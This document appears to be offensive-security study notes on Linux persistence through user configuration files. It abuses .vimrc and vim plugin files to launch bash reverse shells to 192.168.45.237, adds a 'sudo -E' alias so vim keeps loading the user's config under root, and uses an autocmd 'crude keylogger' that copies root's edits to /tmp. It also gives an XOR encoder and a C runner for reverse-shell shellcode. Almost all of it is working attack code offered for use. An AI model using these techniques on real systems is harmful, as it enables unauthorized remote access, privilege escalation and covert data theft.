## User Configuration files

.bash_profile - executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.  
.bashrc - executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.  

### VIM editor

**Edit /home/user/.vimrc file to execute commands when VI(M) is started**  

ways to load code with VIM
1) Put code directly into .vimrc file (:echo "test" / :silent)
2) Place code in another file and then source it with :!source (:!source /home/user/.vimrunscript)
3) VIM plugin file located in .vim/plugin/file.vim


.vimrc file
```
:silent !source ~/.vimrunscript
```

Example .vimrunscript
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

Example .vim/plugin/plugin.vim
```bash
:! bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

##### VIM Priv escalation

**On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, we can add an alias to the user's .bashrc file**  

We need to do this so vim keeps loading the users .vimrc and vim/plugin files.

.bashrc file
```
alias sudo="sudo -E"
```



##### VIM autocmd (keylogger)

this is helpful in restrictive environments where you can preserve enviornment variables or load plugin files etc

Events:
VimEnter (entering VIM), 
VimLeave (leaving VIM), 
FileAppendPre (right before appending to a file), 
BufWritePost (after writing a change buffer to a file).


Make a file in .vim/plugin/settings.vim. **VIM allows if/else logic**.  This is a **CRUDE KEYLOGGER**

```bash
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
<br>

##### C shell code runner 

To compile either one of these below

```bash
gcc -o whatever.out whatever.c -z execstack
```

**This is a encoder file that XOR encodes c payload.**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] =
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x21\xda\xc0\xa8\x2d\xed\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
        char xor_key = 'J';
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
                printf("\\x%02X",buf[i]^xor_key);
        }

        return 0;

}
```
<br>
**This is the shellcode runner that takes x0r encoded payload.**
<br>
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv) 
{
	// Run our shellcode
	int (*ret)() = (int(*)())buf;
  	ret();

}
```
